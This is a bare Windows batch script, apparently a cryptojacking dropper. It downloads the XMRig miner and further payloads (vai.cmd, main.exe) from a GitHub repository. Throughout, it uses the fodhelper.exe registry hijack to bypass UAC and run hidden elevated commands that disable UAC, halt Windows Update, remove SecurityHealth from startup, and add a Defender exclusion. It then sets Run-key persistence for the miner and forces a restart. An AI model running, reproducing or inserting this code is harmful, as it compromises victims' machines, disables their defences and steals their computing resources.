powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip";
powershell Expand-Archive -LiteralPath "C:\Users\Public\Downloads\xmrig.zip" -DestinationPath "C:\Users\Public\Downloads";
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd";
cls
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/main.exe" -OutFile "C:\Users\Public\Downloads\main.exe";
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA 0""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Stop WUAUSERV""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoRebootWithLoggedOnUsers 1""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoRebootWithLoggedOnUsers 1""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU AlwaysAutoRebootAtScheduledTime 0""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU AlwaysAutoRebootAtScheduledTime 0""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run -Name TeamsMachineInstaller""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name SecurityHealth""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name OneDrive""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name OneDrive""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name com.squirrel.Teams.Teams""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Remove-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name com.squirrel.Teams.Teams""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run nomee111 C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run gogogo C:\Users\Public\Downloads\main""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Start WUAUSERV""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Stop WUAUSERV""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\Users\Public\Downloads\""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Restart-Computer""" -Force;
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
fodhelper.exe;
exit
